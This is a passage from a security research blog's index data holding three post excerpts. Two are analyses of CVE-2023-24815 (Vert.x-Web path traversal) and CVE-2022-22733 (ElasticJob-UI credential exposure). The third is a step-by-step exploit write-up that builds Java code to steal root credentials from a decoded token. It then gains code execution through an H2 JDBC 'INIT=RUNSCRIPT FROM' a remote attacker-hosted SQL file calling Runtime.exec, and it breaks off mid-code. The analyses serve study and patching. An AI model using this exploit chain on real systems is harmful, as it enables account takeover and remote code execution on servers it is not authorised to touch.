        "url": "http://localhost:5000/iot%20exploitation/CVE_2021_42885/",
        "teaser": "http://localhost:5000/assets/images/clfrpfz2c1jva0jmx9zt26n4f.png"
      },{
        "title": "CVE-2023-24815: Vert.x-Web Path Traversal Escape",
        "excerpt":"Introduction  A vulnerability discovered in Vert.x-Web known as CVE-2023-24815, a threat actor can exploit this vulnerability to escape the path filter leading to exfiltrate any class path resource or Path Traversal, When tunning on windows.   CVE Information     CVE-ID: CVE-2023-24815   NVD Published Date:  02/09/2023   NVD Last Modified:  02/17/2023   CVSS 3.x: 5.3 MEDIUM   CWE-ID: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)   Testing Lab  We would need an IDE in trhis case i am using IntelliJ and we would need any version of the Vert.x-Web before 4.3.8. You can download the JAR library for it from here.   What is Vert.x-Web ?  Vert.x-Web is a toolkit for building web applications and APIs using the Vert.x framework which is a polyglot, reactive, and high performance application platform for the Java Virtual Machine (JVM). It allows developers to write applications by providing  a set of building blocks for creating it which include routing, authentication, authorization, templating, and serving static files. With its modular and lightweight design, Vert.x-Web enables developers to build scalable, high-performance web applications and APIs quickly and efficiently. Features of Vert.x-Web include:      Flexible routing: Define and match routes based on request methods, paths, headers, and more. You can also add request handlers, failure handlers, and response handlers to routes.   Authentication and authorization: Support for a variety of authentication and authorization mechanisms, including OAuth2, JWT, Basic, and Digest authentication.   Static file handling: Serve static files from the file system or classpath resources.   WebSockets and Server-Sent Events: Support for real-time communication between clients and the server using WebSockets and Server-Sent Events.   CORS and CSRF: Built-in support for Cross-Origin Resource Sharing (CORS) and Cross-Site Request Forgery (CSRF) protection.   Templating engines: Support for multiple templating engines, such as Handlebars, Jade, and Thymeleaf.   The Analaysis  The vulnerability in Vert.x-Web applications running on Windows operating systems when using the StaticHandler with a wildcard mount point (*) is caused by insufficient input validation and improper handling of backslashes in user input, When request is made to the application with a crafted path the Utils.java code computes the relative path to locate the resource using the wildcard mount point, Here is example for the code:   import io.vertx.core.Vertx; import io.vertx.ext.web.Router; import io.vertx.ext.web.handler.StaticHandler;  public class Main {    public static void main(String[] args) {     Vertx vertx = Vertx.vertx();     Router router = Router.router(vertx);      // Configure the StaticHandler with a wildcard mount point     router.route(\"/*\").handler(StaticHandler.create());      vertx.createHttpServer().requestHandler(router).listen(8080);   } }   This will setup up a simple HTTP server and configure it to handle incoming requests using the Router and start listening on port 8080.  Now, Let’s take a look at the vulnerable code to analyze it and understand how the app handle the path. Here is the path for the class (vertx-web/src/main/java/io/vertx/ext/web/impl/Utils.java). The Utils.java Class contains a lot of function and the class contains various utility methods used internally by Vert.x-Web for handling requests, responses, and other web-related tasks and some of the utility methods in the Utils.java class include:     Parsing and normalizing paths: The class has methods for normalizing paths and removing redundant path elements (e.g., ./ and ../).   Handling MIME types: There are methods for getting MIME types based on file extensions and determining the most suitable content type based on the “Accept” header in HTTP requests.   Handling URL encoding and decoding: Utility methods for URL encoding and decoding of strings.   Parsing and handling cookies: Methods for parsing cookies from request headers and creating Set-Cookie headers for responses.   Now, when we scroll down through the class we can see the following method pathOffset.  public static String pathOffset(String path, RoutingContext context) {  First is the define of the pathOffset  method and it  takes a String representing the path and a RoutingContext as arguments.   final Route route = context.currentRoute();   Here it’s getting the current Route from the RoutingContext.   if (route == null) {   return path; } if (!route.isExactPath()) {   final String rest = context.pathParam(\"*\");   if (rest != null) { \t\tif (rest.length() &gt; 0) { \t\t  if (rest.charAt(0) == '/') { \t\t\treturn rest; \t\t  } else { \t\t\treturn \"/\" + rest; \t\t  } \t\t} else { \t\t  return \"/\"; \t\t} \t  } \t}     In this condition If there’s no current route will return the original path, If not null it will check if the current route is not an exact path match, if yes Retrieve the wildcard path parameter (denoted by *) and then check if the wildcard path parameter exists. If the wildcard path parameter exists it will normalize the wildcard path parameter by ensuring it starts with a forward slash (/) and return it. If the parameter is empty it return a single forward slash. And here where is the problem occures.   Patch Diffing  The patch for this vulnerability done as the following(We can find the commit here): First it’s  added the following lines to the Utils.java class:  And the doal of adding this lines is to remove the backslashes \\ with the forwardslashes /. Second they added new class called StaticHandlerWindowsTest and te purpose of this class is to test the behavior of the StaticHandler class on Windows operating systems. This is done by testing the ability of the StaticHandler class to prevent path traversal attacks by attempting to escape to the classpath from different types of routes. Class Code:  package io.vertx.ext.web.handler;  import io.vertx.core.http.HttpMethod; import io.vertx.ext.web.WebTestBase; import org.junit.Test;  public class StaticHandlerWindowsTest extends WebTestBase {    @Test   public void testEscapeToClasspathFromWildcard() throws Exception {     router.clear();     router.route(\"/*\").handler(StaticHandler.create(\"www\"));     // attempt to escape to classpath, given that the handler is mounted on a wildcard,     // reading the wildcard must return a sanitized path and therefore not allow to escape.     testRequest(HttpMethod.GET, \"/..\\\\.htdigest\", 404, \"Not Found\");   }    @Test   public void testEscapeToClasspathFromNull() throws Exception {     router.clear();     router.route().handler(StaticHandler.create(\"www\"));     // attempt to escape to classpath, given that the handler is mounted on a catch all path     testRequest(HttpMethod.GET, \"/..\\\\.htdigest\", 404, \"Not Found\");   }    @Test   public void testEscapeToClasspathFromRegEx() throws Exception {     router.clear();     router.routeWithRegex(\".*\").handler(StaticHandler.create(\"www\"));     // attempt to escape to classpath, given that the handler is mounted on a regex,     testRequest(HttpMethod.GET, \"/..\\\\.htdigest\", 404, \"Not Found\");   }    @Test   public void testEscapeToClasspathFromFixedPath() throws Exception {     router.clear();     router.routeWithRegex(\"/\").handler(StaticHandler.create(\"www\"));     // attempt to escape to classpath, given that the handler is mounted on a regex,     testRequest(HttpMethod.GET, \"/..\\\\.htdigest\", 404, \"Not Found\");   } }   Conclusion  Finally, We highlighted the issue and the mistake behind it &amp; explained the vulnerable code by analyzing and going through it, Also, We discuss the the patch and how the vulnerability got patched in a simple way. To protect yourself from this vulnerability simply upgrade to the last version   References     https://vertx.io/docs/vertx-web/java/   https://github.com/vert-x3/vertx-web/blob/62c0d66fa1c179ae6a4d57344631679a2b97e60f/vertx-web/src/main/java/io/vertx/ext/web/impl/Utils.java#L83   https://github.com/vert-x3/vertx-web/commit/9e3a783b1d1a731055e9049078b1b1494ece9c15   https://github.com/vert-x3/vertx-web   https://jar-download.com/artifacts/io.vertx/vertx-web  ","categories": ["Security Research"],
        "tags": [],
        "url": "http://localhost:5000/security%20research/CVE_2023_24815/",
        "teaser": "http://localhost:5000/assets/images/clgcyasp6268k0js3byulgcph.png"
      },{
        "title": "CVE-2022-22733: Apache ShardingSphere ElasticJob-UI privilege escalation",
        "excerpt":"Introduction   A vulnerability discovered in Apache ShardingSphere ElasticJob-UI known as CVE-2022-22733, The vulnerability lead to exposure of sensitive informatiopns and as a results it allows an attacker who has guest account to do privilege escalation.   Testing Lab   For the testing lab the vulnerability affecting version 3.0.0 and prior versions. So, we can use docker to build our testing lab, First pull the docker image:   sudo docker pull apache/shardingsphere-elasticjob-lite-ui:3.0.0   Now, Let’s run the app:   sudo docker run -d --name elasticjob-ui -p 8088:8088 -e ELASTIC_JOB_GUEST_ENABLED=true apache/shardingsphere-elasticjob-lite-ui:3.0.0   Here it will run the app and enable the guest access, Therefore we can simulate and reproduce the vulnerability.          What is ShardingSphere ElasticJob-UI ?   ShardingSphere ElasticJob-UI is a web-based graphical user interface (GUI) that is part of the ShardingSphere ElasticJob project and provides an easy-to-use interface to manage, monitor, and visualize the status of jobs running in a ShardingSphere ElasticJob cluster. It simplifies the management and administration of distributed scheduling tasks, making it more convenient for users to manage their jobs without dealing directly with the underlying API or configuration files.       Static Analysis   Let’s Open burpsuite and take a look at the login request and response.      In the above screenshot when we login, It provide us back with a response contains the accessToken. If we copy the accessToken value and decode it:      As we can see after decoding the value, It’s exposed the guest username and password which is the user we logged-in with &amp; Also exposed the root username and password, As a results we can use the exposed root creds and escalate our privileges. Let’s see the root cause of this issue by analyzing and going through the login/authentication process code. Now, Under the following class org.apache.shardingsphere.elasticjob.lite.ui.security.AuthenticationFilter we can see the following:      Which obvuise is the endpoint where the authentication process happens, Let’s dig deeper into the class code:      First, It’s defining the package and import needed libraries by scrolling down we can see the start of defining the class:      This AuthenticationFilter class implements the Filter interface and has a constant LOGIN_URI that represents the URI for the login endpoint, a Gson object for JSON serialization and deserialization, and a UserAuthenticationService object from the UserAuthenticationService class that can be set using a setter method. If we go to that class under the same location we will be able to see that it’s responsiable to check for the user in the authentication process. In other words, It’s a main part of the authentication. As we mentioned before about the Filter interface, It’s basically a part of the Servlet API and is used to define filters that can intercept requests and responses going to and coming from a web application, For example, modifying request parameters, add or modify request headers, perform logging, and even transform the response returned by the server. Something important we have to know about the Filter interface and It’s that the Filter interface contains three methods:           init(FilterConfig config): This method is called when the filter is initialized and It allows the filter to perform any initialization that is required.            doFilter(ServletRequest request, ServletResponse response, FilterChain chain): This method is called for every incoming request that matches the filter mapping and It allows the filter to examine or modify the request, perform any filtering logic, and then pass the request on to the next filter in the chain or to the servlet.            destroy(): This method is called when the filter is destroyed and It allows the filter to perform any cleanup that is required.    By completing our lines of codes we can see the doFilter() method:          The method takes three parameters servletRequest, servletResponse and filterChain, servletRequest and servletResponse parameters are instances of the ServletRequest and ServletResponse interfaces, respectively. The filterChain parameter is an object that represents the next filter in the chain or the servlet that the request is being sent to. Then, The method first casts the ServletRequest and ServletResponse objects to HttpServletRequest and HttpServletResponse, respectively. After that it checks if the request URI matches the LOGIN_URI constant. If it does, the handleLogin method is called to handle the login request and If not the method checks if the request has a valid access token by checking the value of the Access-Token header. If the access token is valid, the request is passed on to the next filter in the chain using the doFilter method of the FilterChain object. Otherwise, the respondWithUnauthorized method is called to return an unauthorized status code to the client.      The destroy() method is empty and is used to clean up any resources used by the filter and handleLogin method is responsible for handling user login requests. It receives a HttpServletRequest object, which contains the user’s credentials, and a HttpServletResponse object, which is used to return the server’s response.It’s first reads the user’s credentials from the request using the getReader method and converts them to a UserAccount object using the gson.fromJson method. Then calls the checkUser method of the userAuthenticationService object to check the validity of the user’s credentials. If the credentials are valid the method creates a HashMap object to hold the user’s information, including their username, accessToken, and whether they are a guest user. It then writes this information to the response using the httpResponse.getWriter().write method after converting it to a JSON string using the gson.toJson method. If the user’s credentials are invalid, the method calls the respondWithUnauthorized method, which writes a JSON string to the response indicating that the user is unauthorized.      In this line we can notice it’s where the accessToken returned to the user and it’s being called from the getToken() method from userAuthenticationService object which is the userAuthenticationService class. Now, If we go to the class:   package org.apache.shardingsphere.elasticjob.lite.ui.security;  import com.google.common.base.Strings; import com.google.gson.Gson; import lombok.Setter; import org.apache.commons.codec.binary.Base64; import org.springframework.boot.context.properties.ConfigurationProperties; import org.springframework.stereotype.Component;  /**  * User authentication service.  */ @Component @ConfigurationProperties(prefix = \"auth\") @Setter public final class UserAuthenticationService {          private String rootUsername;          private String rootPassword;          private String guestUsername;          private String guestPassword;          private final Base64 base64 = new Base64();          private Gson gson = new Gson();          /**      * Check user.      *      * @param userAccount user account      * @return check success or failure      */   We can see that it starts with defining the package, class and some variables which we can see in the accessToken when we decoded it such as rootUsername, rootPassword, guestUsername &amp; guestPassword and creates a new Base64 object along with JSON object to store data into.       public AuthenticationResult checkUser(final UserAccount userAccount) {         if (null == userAccount || Strings.isNullOrEmpty(userAccount.getUsername()) || Strings.isNullOrEmpty(userAccount.getPassword())) {             return new AuthenticationResult(null, null, false, false);         }         if (rootUsername.equals(userAccount.getUsername()) &amp;&amp; rootPassword.equals(userAccount.getPassword())) {             return new AuthenticationResult(rootUsername, rootPassword, true, false);         }         if (guestUsername.equals(userAccount.getUsername()) &amp;&amp; guestPassword.equals(userAccount.getPassword())) {             return new AuthenticationResult(guestUsername, guestPassword, true, true);         }         return new AuthenticationResult(null ,null, false, false);     }      /**      * Get user authentication token.      *      * @return authentication token      */     public String getToken() {         return base64.encodeToString(gson.toJson(this).getBytes());     } }   After that It provides a method to check user authentication by comparing the provided username and password with the pre-configured root and guest usernames and passwords. Finally, We can see the getToken() method that encodes the current UserAuthenticationService object as a Base64 encoded string which is returned as the authentication token (accessToken) and here comes the vulnerability with the getToken() method is returning the Base64 string with representation of the entire UserAuthenticationService object including the root username and password. As a results it’s exposed as we saw in the first of the analysis.   Dynamic Analysis   Now, Let’s Setup our lab in debugging mode to see how it works dynamically. As we pulled the image before we will just run it again with a different name and port.   sudo docker run -d --name elasticjob-ui-debug -p 8888:8088 -p 8000:8000 -e ELASTIC_JOB_GUEST_ENABLED=true -e JAVA_TOOL_OPTIONS=\"-agentlib:jdwp=transport=dt_socket,address=8000,server=y,suspend=n\" apache/shardingsphere-elasticjob-lite-ui:3.0.0   Here we added a new port mapping which is 8000 for debugging and also added new environment variable to set debugging options JAVA_TOOL_OPTIONS=\"-agentlib:jdwp=transport=dt_socket,address=8000,server=y,suspend=n\" &amp; Finally, a port mapping for the web interface of the application 8888 to 8088. Now, It’s time to setup our debugger through IntelliJ IDE, We need to download the ShardingSphere version 3.0.0 source code from github and open it as a new project inside IntelliJ IDE.      After that go to Run Tab and then click on Edit Configurations:      Then Click on the + add sign and choose Remote JVM Debug:      And Name it as you want &amp; configure the remote debugger, By adding the machine docker IP, Debugging port which is 8000 and the module to debug which is the ShardingSphere-ElasticJob-lite-UI:      Finally, Let’s set our breakpoint on the handlelogin function under the org.apache.shardingsphere.elasticjob.lite.ui.security.AuthenticationFilter class:      Now, Press on the debug button:      We can see it’s telling us that’s connected successfully to the targeted VM debug:      Let’s visit the application on our browser and login. Once we hit the Login button, We will be able to see that it’s hit the breakpoint and our debugger is working:      Here under this in the debugger which refers within the AuthenticationFilter class that it has the UserAuthenticationService Object which is made out of the UserAuthenticationService class itself:      We can see that it’s already carry the guest &amp; root names and passwords, Along with the created Objects of Base64 and Gson. Now, Let’s step over and set a breakpoint to line where accessToken get added to the request:      In the above screenshot as we see, By stepping over until we arrive to checkUser() function which is taking the credentials entered by user.      By stepping over 2 more steps we can see that the authenticationResult started to created &amp; Mentioned under it the username,password which are our credentials, success which is the authentication status and in this situation it’s true as credentials matched &amp; Finally, isGuest which indicates if the user is a guest or no and in our case yes it’s.      here we can see the result which is a HashMap and will be sent with the response body. Clearly it’s generated the token and if we take this value &amp; decode it we will be able to see the exposure of the root username and password, along with the guest username and password that loaded at first of the debugging in a refer with the UserAuthenticationService class object. If we do the same with the root account we obtained from the token which is root:root &amp; see how it will be remain the same and will return the both users accounts in the token as we can see in the below screenshot:      Patch Diffing   Now, Coming to the patches that applied on the code, It’s a lot of modifications but, we will focus on the modifications made for the classes.   UserAuthenticationService.java      The vulnerability in the original code block is that the getToken() method of the UserAuthenticationService class returns a token that contains the root username and password in plaintext which used in the doFilter() method to authenticate the user, which allows an attacker to extract the root username and password by intercepting and decoding the token and the patched code block fixes the vulnerability by changing the getToken() method to isValidToken() and getToken() methods which check if the token is valid and return a new token that does not contain the root username and password. Additionally, the handleLogin() method in the patched code block now checks if the user is authenticated using a valid token instead of using the vulnerable getToken() method. If the token is valid, the filterChain.doFilter() method is called to allow the user to access the requested resource. Otherwise, the respondWithUnauthorized() method is called to deny access to the user.   UserAuthenticationFilter.java      The changes made to the AuthenticationFilter class prevent the vulnerability by implementing token based authentication instead of using a hardcoded username and password. Specifically, Adding the ability to generate a token based on a user’s credentials using the getToken() method in the UserAuthenticationService class. This token is generated using the com.auth0.jwt library and is signed using a randomly generated HMAC256 algorithm and isValidToken() method to the UserAuthenticationService class to check if the provided token is valid or not, Also Modified the handleLogin and doFilter methods. Additionally, the AuthenticationFilter class is modified to use the ObjectMapper instead of Gson for JSON serialization and deserialization. In the handleLogin() method the gson.fromJson() call is replaced with objectMapper.readValue() to deserialize the UserAccount object. Finally, in the doFilter() method, the if statement that checks for the access token is modified to use the isValidToken() method instead of checking for equality with the token obtained from userAuthenticationService.getToken().   Conclusion      At the end, We saw how the vulnerability occured and why, By showing the wrong implementation of authentication process and showed how it’s fixed in the patch applied to the code by using the JWT Library to generate the token with a secret key to which keeps the confidntiality of the data. As a results it’s not exposing the credentials anymore.   Resources           https://github.com/apache/shardingsphere-elasticjob-ui/commit/f3afe51221cd2382e59afc4b9544c6c8a4448a99?diff=split            https://hub.docker.com/layers/apache/shardingsphere-elasticjob-lite-ui/3.0.0-beta/images/sha256-9e5f309485b252a397f3cf91177be810e0f170349416de377c7393876d1069e2?context=explore            https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22733            https://github.com/apache/shardingsphere-elasticjob-ui/releases/tag/3.0.0      ","categories": ["Security Research"],
        "tags": [],
        "url": "http://localhost:5000/security%20research/CVE_2022_22733/",
        "teaser": "http://localhost:5000/assets/images/clgupfc8l1whj0jqg8hpn3bjf.png"
      },{
        "title": "Exploit Writing: CVE-2022-22733 Privilege Escalation & RCE",
        "excerpt":"Introduction   In the previous blog from here, We have done analysis for CVE-2022-22733 and understand the root cause of the vulnerability &amp; the issue in details. Now, It’s the time to develop an exploit for this vulnerability and take it more further than just escalating our privileges.   The Exploit   As we know from the analysis that to exploit the vulnerability, We need to perform the following steps:           Login with the low-privileged account.            Obtain the unsecure generated accessToken.            Decode the unsecure generated accessToken.            Parse the decoded data from the accessToken.            Retrieve root account credentials from the parsed data.            Login with the root account credentials and obtain a full privileges on the application.       But, This time we will add a one more step that will allow us to achieve code execution on the target server, By performing the JDBC Attack you could read more about it from here.   Login with the low-privileged account   So, First we need to perform a login request with the low-privileged account provided by the user. So, what do we need here ?:           take input from user which is username and password            The login request and it’s form is as the following:       Login request:   POST /api/login HTTP/1.1 Host: 192.168.0.162:8888 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0 Accept: application/json, text/plain, */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/json;charset=utf-8 Access-Token:  Content-Length: 39 Origin: http://192.168.0.162:8888 DNT: 1 Connection: close Referer: http://192.168.0.162:8888/  {\"username\":\"guest\",\"password\":\"guest\"}   We can see that the request is a POST request to the /api/login endpoint made to the host of 192.168.0.162 and port 8888. So, we first need from the user a host and port of the server where the application is running. along with the username and password that we would use for authentication.   import java.net.URL; import java.net.HttpURLConnection; import java.util.Scanner;  public class Main {     public static void main(String[] args) throws Exception {         Scanner scanner = new Scanner(System.in);         System.out.print(\"[+] Enter host: \");         String host = scanner.nextLine();         System.out.print(\"[+] Enter port: \");         String port = scanner.nextLine();         System.out.print(\"[+] Enter username: \");         String username = scanner.nextLine();         System.out.print(\"[+] Enter password: \");         String password = scanner.nextLine();         scanner.close();         String url = \"http://\" + host + \":\" + port + \"/api/login\";         URL obj = new URL(url);         HttpURLConnection con = (HttpURLConnection) obj.openConnection();         con.setRequestMethod(\"POST\");         con.setRequestProperty(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0\");         con.setRequestProperty(\"Accept\", \"application/json, text/plain, */*\");         con.setRequestProperty(\"Accept-Language\", \"en-US,en;q=0.5\");         con.setRequestProperty(\"Accept-Encoding\", \"gzip, deflate\");         con.setRequestProperty(\"Content-Type\", \"application/json;charset=utf-8\");         con.setRequestProperty(\"Access-Token\", \"\");         con.setRequestProperty(\"Origin\", \"http://\" + host + \":\" + port);         con.setRequestProperty(\"DNT\", \"1\");         con.setRequestProperty(\"Connection\", \"close\");         con.setRequestProperty(\"Referer\", \"http://\" + host + \":\" + port + \"/\");         String body = \"{\\\"username\\\":\\\"\" + username + \"\\\",\\\"password\\\":\\\"\" + password + \"\\\"}\";         con.setDoOutput(true);         con.getOutputStream().write(body.getBytes(\"UTF-8\"));         int responseCode = con.getResponseCode();         System.out.println(\"[*] Response Code: \" + responseCode);     } }   Here we imported the needed libraries from java.net &amp; java.util and then read the input of host,port,username and password from the user using then closed the scanner object we created:   Scanner scanner = new Scanner(System.in); System.out.print(\"[+] Enter host: \"); String host = scanner.nextLine(); System.out.print(\"[+] Enter port: \"); String port = scanner.nextLine(); System.out.print(\"[+] Enter username: \"); String username = scanner.nextLine(); System.out.print(\"[+] Enter password: \"); String password = scanner.nextLine(); scanner.close();   After that we created a URL object to handle the URL for login endpoint inside the obj, Then we created Http connection to our URL object and assign the connection to con which is the Http connection object:   String url = \"http://\" + host + \":\" + port + \"/api/login\";         URL obj = new URL(url);         HttpURLConnection con = (HttpURLConnection) obj.openConnection();   In the coming lines, We set the request method and the headers needed for the request through the methods under the con object:   con.setRequestMethod(\"POST\"); con.setRequestProperty(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0\"); con.setRequestProperty(\"Accept\", \"application/json, text/plain, */*\"); con.setRequestProperty(\"Accept-Language\", \"en-US,en;q=0.5\"); con.setRequestProperty(\"Accept-Encoding\", \"gzip, deflate\"); con.setRequestProperty(\"Content-Type\", \"application/json;charset=utf-8\"); con.setRequestProperty(\"Access-Token\", \"\"); con.setRequestProperty(\"Origin\", \"http://\" + host + \":\" + port); con.setRequestProperty(\"DNT\", \"1\"); con.setRequestProperty(\"Connection\", \"close\"); con.setRequestProperty(\"Referer\", \"http://\" + host + \":\" + port + \"/\");   Finally, We created the request body and pass the user input to it and pass it to the con Http object to be included in the request &amp; after that to print us the Response status code:   con.setDoOutput(true); con.getOutputStream().write(body.getBytes(\"UTF-8\")); int responseCode = con.getResponseCode(); System.out.println(\"[*] Response Code: \" + responseCode);   Now, It’s time to try our first step code:              As we can see our first step done successfully, Let’s move to the next step.   Obtain the accessToken   Now, Let’s send the normal login request within burp suite repeater, We can see that the response body is a JSON format:          As we focusing here we focus on the value of accessToken key with in JSON data. But, We can see that the accessToken key is under model array. So, When we parse the JSON data we will get the value of model array then get the accessToken value from it.   BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream())); String inputLine; StringBuffer response = new StringBuffer(); while ((inputLine = in.readLine()) != null) {     response.append(inputLine); } in.close(); JSONObject jsonObject = new JSONObject(response.toString()); JSONObject model = jsonObject.getJSONObject(\"model\"); String accessToken = model.getString(\"accessToken\"); System.out.println(\"[*] Acess Token: \" + accessToken);   After importing the new needed modules java.io.BufferedReader,org.json.JSONObject,java.io.InputStreamReader. Here we created a BufferReader object named in and assign response we got from the application into it, Then we define a String named inputLine to use it in our loop to store the response lines and then assign it to the StringBuffer object named response which gonna contain the JSON data we want. then we closed in. After that we define a JSON object named jsonObject and store the response in it as a string format, Then we created another JSON object named model and store the value of model key from the JSON data in it, Finally we created a string named accessToken and assign the value of accessToken key inside model array into it and print that value out.      And here we can see, Step 2 of our exploit is done.   Decode the accessToken   We can easily identify that the accessToken value is base64, So, Now we need to decode it to a normal string. And this will be done easily using the following 2 lines after importing the needed modules java.nio.charset.StandardCharsets,java.util.Base64:   byte[] decodedBytes = Base64.getDecoder().decode(accessToken.getBytes(StandardCharsets.UTF_8)); String decodedAccessToken = new String(decodedBytes, StandardCharsets.UTF_8); System.out.println(\"[*] Decoded Acess Token: \" + decodedAccessToken);   Here we created a byte array named decodedBytes that will decode the accessToken value and store inside it, After that define a string named decodedAccessToken that will store the bytes after converting it to a string and then will be printed out.          Here we can see see the decoded token and the 3rd step of the exploit done successfully.   Parse the decoded data from the accessToken &amp; Retrive root account credentials   It’s time now for step 4 &amp; 5. As the decoded data from the accessToken is JSON format. Then let’s part it and Retrieve the root account credentials.   JSONObject decodedJsonObject = new JSONObject(decodedAccessToken); String rootUsername = \"\"; String rootPassword = \"\"; if (decodedJsonObject.has(\"rootUsername\") &amp;&amp; decodedJsonObject.has(\"rootPassword\")) {     rootUsername = decodedJsonObject.getString(\"rootUsername\");     rootPassword = decodedJsonObject.getString(\"rootPassword\");     System.out.println(\"[*] Root username: \" + rootUsername);     System.out.println(\"[*] Root password: \" + rootPassword); } else {     System.out.println(\"[-] Access token does not contain rootUsername and rootPassword keys.\"); }   We created a JSON object named decodedJsonObject and assign the decoded accessToken value to it, Then define 2 strings with empty value for username and password we will retrive later. After that we made if condition to check if the JSON data has the rootUsername &amp; rootPassword keys to Retrievethe credentials from it, If it’s exist then it will assign the values to the string variables we defined early which are rootUsername &amp; rootPassword after that it will print the values out, And if not found, It will print us a massege telling us it’s not found.      And here we can see our 4th &amp; 5th steps done successfully.   Login with the root account credentials and obtain a full privileges on the application   Now, we want to use the root credentials we obtained, To login into the application and Retrieve the accessToken will back with the response which is gonna be with full privileges on the application as the authentication done with the root account.   HttpURLConnection con3 = (HttpURLConnection) obj.openConnection();             con3.setRequestMethod(\"POST\");             con3.setRequestProperty(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0\");             con3.setRequestProperty(\"Accept\", \"application/json, text/plain, */*\");             con3.setRequestProperty(\"Accept-Language\", \"en-US,en;q=0.5\");             con3.setRequestProperty(\"Accept-Encoding\", \"gzip, deflate\");             con3.setRequestProperty(\"Content-Type\", \"application/json;charset=utf-8\");             con3.setRequestProperty(\"Access-Token\", \"\");             con3.setRequestProperty(\"Origin\", \"http://\" + host + \":\" + port);             con3.setRequestProperty(\"DNT\", \"1\");             con3.setRequestProperty(\"Connection\", \"close\");             con3.setRequestProperty(\"Referer\", \"http://\" + host + \":\" + port + \"/\");             String requestBody3 = \"{\\\"username\\\":\\\"\" + rootUsername + \"\\\",\\\"password\\\":\\\"\" + rootPassword + \"\\\"}\";             con3.setDoOutput(true);             con3.getOutputStream().write(requestBody3.getBytes(\"UTF-8\"));             int responseCode3 = con3.getResponseCode();             System.out.println(\"[*] Root Login Response Code: \" + responseCode3);             BufferedReader in3 = new BufferedReader(new InputStreamReader(con3.getInputStream()));             String inputLine3;             StringBuffer response3 = new StringBuffer();             while ((inputLine3 = in3.readLine()) != null) {                 response3.append(inputLine3);             }             in3.close();             JSONObject jsonObject3 = new JSONObject(response3.toString());             JSONObject model3 = jsonObject3.getJSONObject(\"model\");             String accessToken3 = model3.getString(\"accessToken\");             System.out.println(\"[*] Root Access Token: \" + accessToken3);   Here we created a new Http Object named con3 and used the same URL for login, In short, We copied the first login request but replaced the login credentials with the one we obtained from the first login process and parsed the new accessToken returned as a results from the root account authentication &amp; Stored it in accessToken3 variable and printed it out.      Here as we can see it’s done successfully and Retrieved the token based on the root account.   Achieve RCE   Now, You may be wondering, If we have the root account credentials, Why we would need to Retrieve it’s token ?. So, Basically to perform a connection throug the JDBC we need high-privileges and to automate this process let’s see how it works first.          As you can see when we logged-in as guest we are not able to add any data source. But, If we login with the root account. We can see that we have the privileges to add data source and test the connection          Now, Under the Event Tracer Data Source click on Add button and add the following:      What did we done here?. We named Our data source, then used the h2 driver the H2 itself is a relational database management system, and the org.h2.driver is a JDBC driver used to connect to an H2 database from Java. The URL value:   jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://192.168.0.162:8000/poc.sql'   Basically, This is a JDBC connection string which will connect a H2 in memory database with the name we give which is testdb. Then, TRACE_LEVEL_SYSTEM_OUT=3 parameter enables trace logging to be printed to the console. Finally, INIT=RUNSCRIPT FROM 'http://192.168.0.162:8000/poc.sql' parameter specifies that the poc.sql script located at our URL should be executed when the database is initialized. But, What is inside poc.sql file ?:   CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return \"123\";}';CALL EXEC ('calc.exe')   In short words, This sql script uses the H2 database ability to create an alias to execute command and here we executing calc.exe for the demo of the exploit. Now, Let’s start our http server that will host our poc.sql script and after that we click on Test Connect Button:          It’s time now to take the request of the connection and added to our exploit code.   Request:   POST /api/data-source/connectTest HTTP/1.1 Host: 192.168.0.162:8088 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0 Accept: application/json, text/plain, */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/json;charset=utf-8 Access-Token: Root_access_token Content-Length: 185 Origin: http://192.168.0.162:8088 DNT: 1 Connection: close Referer: http://192.168.0.162:8088/ Cookie: JSESSIONID=C9B7BAFA141D48D0D26178AD8F489668  {\"name\":\"azima\",\"driver\":\"org.h2.Driver\",\"url\":\"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://192.168.0.162:8000/poc.sql'\",\"username\":\"test\",\"password\":\"test\"}   As we can see we will create a new HTTP connection object with a new URL object for the connection request to perform the JDBC Attack. So, Here we need to replace the SQL script URL with one provided by the user.   String url2 = \"http://\" + host + \":\" + port + \"/api/data-source/connectTest\"; String requestBody = \"{\\\"name\\\":\\\"azima\\\",\\\"driver\\\":\\\"org.h2.Driver\\\",\\\"url\\\":\\\"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '\"+JDBC+\"'\\\",\\\"username\\\":\\\"a\\\",\\\"password\\\":\\\"a\\\"}\";  URL obj2 = new URL(url2); HttpURLConnection con2 = (HttpURLConnection) obj2.openConnection();   con2.setRequestMethod(\"POST\"); con2.setRequestProperty(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0\"); con2.setRequestProperty(\"Accept\", \"application/json, text/plain, */*\"); con2.setRequestProperty(\"Accept-Language\", \"en-US,en;q=0.5\"); con2.setRequestProperty(\"Accept-Encoding\", \"gzip, deflate\"); con2.setRequestProperty(\"Content-Type\", \"application/json;charset=utf-8\"); con2.setRequestProperty(\"Access-Token\", accessToken3); con2.setRequestProperty(\"Origin\", \"http://\" + host + \":\" + port); con2.setRequestProperty(\"DNT\", \"1\"); con2.setRequestProperty(\"Connection\", \"close\"); con2.setRequestProperty(\"Referer\", \"http://\" + host + \":\" + port + \"/\"); con2.setDoOutput(true);   DataOutputStream wr = new DataOutputStream(con2.getOutputStream()); 